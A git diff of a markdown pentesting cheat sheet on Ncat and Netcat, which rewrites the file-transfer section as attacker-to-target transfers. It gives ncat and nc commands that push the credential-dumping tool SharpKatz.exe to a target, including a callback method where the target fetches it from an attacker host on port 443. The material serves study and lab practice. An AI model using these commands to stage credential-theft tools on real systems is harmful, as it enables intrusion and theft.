@@ -25,6 +25,23 @@ links: "[[Netcat]]"
 
 ___
 
+
+<!-- Install {{{-->
+## Install
+
+**Linux**
+
+```sh
+sudo apt install nmap
+```
+
+**Windows**
+
+Windows binary version - [Ncat 5.59BETA1](https://nmap.org/dist/ncat-portable-5.59BETA1.zip)
+
+___
+<!-- }}} -->
+
 <!-- Usage {{{-->
 ## Usage
 
@@ -78,18 +95,146 @@ ncat [OPTIONS...] [hostname] [port]
 <!-- File Transfer {{{-->
 ### File Transfer
 
-Listen to an incoming connection on port `8080` and write any received data to
-`received_file`
+Transfer files from the attacker to the target
 
-```sh
-ncat -l 8080 > <received_file>
+**METHOD 1**
+
+Send a file from the attacker macine to the target machine
+
+```mermaid
+flowchart LR
+   Attacker -- File --> Target
 ```
 
-Connect to a server on port `8080` and send the content of `file_to_send`
+<!-- Warning {{{-->
+> [!warning]
+>
+> Ingress connections may be blocked by firewalls
+>
+<!-- }}} -->
+
+1. **Target**: Listen to the incoming connection
+
+[Ncat](https://nmap.org/ncat/)
 
 ```sh
-ncat localhost 8080 < <file_to_send>
+ncat -l -p 8000 --recv-only > SharpKatz.exe
 ```
+<!-- Info {{{-->
+> [!info]-
+>
+> - `-recv-only`: Close the connection once the file transfer is finished
+>
+<!-- }}} -->
+
+[nc](https://en.wikipedia.org/wiki/Netcat)
+
+```sh
+nc -l -p 8000 > <out_file>
+```
+
+2. **Attacker**: Send a file to the target
+
+[Ncat](https://nmap.org/ncat/)
+
+```sh
+ncat --send-only $target 8000 < <file>
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+> ```
+>
+<!-- }}} -->
+
+[nc](https://en.wikipedia.org/wiki/Netcat)
+
+```sh
+nc -q 0 $target 8000 < <file>
+```
+
+<!-- Info {{{-->
+> [!info]-
+>
+> - `-q 0`: Close the connection after EOF on stdin
+>
+<!-- }}} -->
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+> ```
+<!-- }}} -->
+
+**METHOD 2**
+
+Connect to the attacker machine to retrieve a file to the target
+
+```mermaid
+flowchart LR
+   B[Target] -- Connection --> A[Attacker] -- File --> B
+```
+
+1. **Attacker** - Listen to incoming connection and serve a file
+
+[Ncat](https://nmap.org/ncat/)
+
+```sh
+sudo ncat -l -p 443 --send-only < <file>
+```
+
+[nc](https://en.wikipedia.org/wiki/Netcat)
+
+```sh
+sudo nc -l -p 443 -q 0 < <file>
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> sudo nc -l -p 443 -q 0 < SharpKatz.exe
+> ```
+>
+<!-- }}} -->
+
+2. **Target** - Connect to the attacker to receive a file
+
+[Ncat](https://nmap.org/ncat/)
+
+
+```sh
+ncat <attacker_ip> 443 --recv-only > <out_file>
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+> ```
+<!-- }}} -->
+
+[nc](https://en.wikipedia.org/wiki/Netcat)
+
+```sh
+nc <attacker_ip> 443 > <out_file>
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> nc 192.168.49.128 443 > SharpKatz.exe
+> ```
+<!-- }}} -->
+
+
 <!-- }}} -->
 
 <!-- Port Scanning {{{-->
@@ -216,14 +361,6 @@ ncat -nv $target <port>
 <!-- }}} -->
 
 <!-- }}} -->
-
-___
-<!-- }}} -->
-
-<!-- Download {{{-->
-## Download
-
-Windows binary version - [Ncat 5.59BETA1](https://nmap.org/dist/ncat-portable-5.59BETA1.zip)
 
 ___
 <!-- }}} -->
